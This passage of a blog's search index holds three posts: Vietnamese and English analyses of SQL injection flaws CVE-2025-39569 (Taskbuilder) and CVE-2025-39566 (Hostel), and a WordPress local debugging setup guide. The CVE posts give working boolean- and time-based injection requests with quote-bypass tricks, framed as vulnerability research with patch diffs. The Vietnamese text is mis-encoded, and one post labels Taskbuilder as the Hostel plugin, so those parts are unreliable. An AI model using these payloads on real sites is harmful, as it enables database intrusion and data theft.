/wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings ‚Äî indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed ‚Üí SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds ‚Üí we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds ‚Üí database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It‚Äôs an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: ‚Äúfish where the fish are‚Äù Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I‚Äôll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine‚Äôs services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it‚Äôs usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won‚Äôt help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system‚Äôs hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB ‚Äì 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB ‚Äì 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you‚Äôll see errors like:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ It‚Äôs recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It‚Äôs an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n 